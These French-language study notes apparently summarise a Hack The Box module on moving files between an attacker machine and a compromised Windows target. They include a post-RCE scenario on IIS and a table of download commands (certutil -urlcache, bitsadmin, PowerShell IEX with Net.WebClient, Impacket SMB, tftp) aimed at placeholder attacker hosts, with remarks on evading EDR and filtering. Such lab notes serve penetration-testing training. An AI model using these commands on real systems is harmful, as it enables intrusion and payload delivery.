# introduction transfert de fichiers 

🎯 Objectif

Apprendre différentes méthodes de transfert de fichiers entre une machine attaquante et une cible, malgré les restrictions réseau, les contrôles de sécurité, et les limitations de l’environnement.

🧪 Scénario pratique
Un attaquant obtient un accès RCE sur un serveur IIS via un upload non filtré.

Tentatives de transfert de fichiers pour élever les privilèges :

PowerShell bloqué par une politique de contrôle d’application.

Certutil inutilisable à cause d’un filtrage Web strict (GitHub, Dropbox bloqués).

FTP inaccessible (port TCP 21 bloqué).

SMB (TCP 445) ouvert → solution fonctionnelle via Impacket smbserver.

🔐 Contraintes fréquentes
Contrôles hôtes : Application Whitelisting, Antivirus/EDR.

Contrôles réseau : Pare-feu, IDS/IPS, filtrage de contenu ou de ports.

🧰 Méthodes de transfert à connaître
Basées sur des outils nativement disponibles sur Windows/Linux.

Non-exhaustives mais adaptables à diverses situations.

Le module présente des exemples pratiques sur machines Windows/Linux.

📚 Recommandations
Expérimenter toutes les méthodes présentées dans le module.

Comparer les méthodes selon leur efficacité, discrétion et applicabilité.

Réutiliser ces techniques dans les autres modules HTB ou dans les labos de la plateforme.

 Synthèse : Méthodes de Transfert de Fichiers - Windows 
 
🎯 Objectif
Savoir transférer des fichiers depuis/vers un système Windows cible lors d'un engagement, malgré les restrictions réseau et les contrôles de sécurité.

📦 Outils natifs ou courants utilisés pour le transfert
Méthode	Détails & Commandes Exemple	Remarques
certutil	certutil -urlcache -split -f <URL> fichier.exe	Peut être bloqué par EDR/AV, utile si pas filtré
bitsadmin	bitsadmin /transfer <nom> <URL> <fichier>	Obsolète, parfois toujours dispo
PowerShell	Invoke-WebRequest ou IEX(New-Object Net.WebClient)	Souvent bloqué ou restreint
FTP	ftp (mode interactif)	Peut être bloqué (port 21), peu discret
SMB (Impacket)	smbserver.py + copy \\<IP>\<share>\fichier	Efficace si SMB autorisé en sortie
Python HTTP	python3 -m http.server côté attaquant	Simple serveur de fichiers
tftp	tftp -i <IP> GET fichier	Rarement autorisé, très vieux

🚧 Limitations fréquentes
Contrôles hôtes : Application Whitelisting, Antivirus, EDR.

Contrôles réseau : Pare-feux bloquant ports comme 21 (FTP), 80/443 externes, etc.

Filtrage de contenu : Accès restreint à GitHub, Google Drive, etc.

✅ Recommandations
Tester chaque méthode selon les contraintes de l’environnement cible.

Automatiser si possible (scripts, PowerShell).

Être capable d'adapter les techniques à la configuration du système cible.

Observer les comportements des outils utilisés (journaux, alertes EDR, etc.)